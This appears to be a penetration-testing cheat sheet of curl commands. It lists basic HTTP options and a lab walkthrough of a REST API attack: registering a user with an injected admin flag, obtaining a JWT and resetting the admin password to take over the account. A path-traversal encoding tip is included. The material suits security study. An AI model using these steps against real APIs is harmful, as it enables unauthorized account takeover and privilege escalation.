

# Curl

```powershell

# ------- HTTP -------------
curl "http/https:url" # Simple http / https request
curl -i "url" # see the response header
curl -v "url" # see the request and response header
curl --path-as "url" # Disable  URL-decoding (include characters like /%252e%252e/ (/../))
curl "url" -O # Capital O: save the file with its remote name
curl "url" -o "filename.txt" # Small -o: save the file with a given name 
curl "url" --proxy 127.0.0.1:8080 # use proxy
curl "curl" --user-agent "XSS" # set user-agent

# --------- APIs -----------
# Attempt to register a user
curl -d '{"password":"lab","username":"fake","email":"pwn@fake.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register

#Attempt to login with the created user
curl -d '{"password":"lab","username":"fake"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
# Example response with JWT auth token:
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}


# Attempt to change admin password by HTTP PUT request with the retrieved JWT token:
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'

# Login with the admin user:
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

```



